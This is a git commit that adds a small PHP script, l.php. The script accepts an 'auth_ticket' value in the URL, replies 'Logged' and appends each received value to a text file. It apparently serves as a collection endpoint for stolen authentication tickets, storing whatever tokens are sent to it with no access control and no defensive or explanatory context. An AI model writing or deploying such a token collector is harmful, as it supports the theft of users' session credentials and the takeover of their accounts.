467218e93263f6ae0f8c9712b428f3402d2800a3
jordyjoestar <66799726+jordyjoestar@users.noreply.github.com>
2020-06-29 21:49:21 +0100

    Update l.php

--- l.php
+++ l.php
@@ -1,1 +1,10 @@
+<?php
+if(!$_GET['auth_ticket']){
+die('Auth Empty!');
+} 
+echo 'Logged ' . htmlspecialchars($_GET["auth_ticket"]);
 
+$f = fopen("auth.txt", 'a+') or die( 'No txt file!');
+fwrite($f, "\n". $_GET["auth_ticket"]);
+fclose($f);
+?>
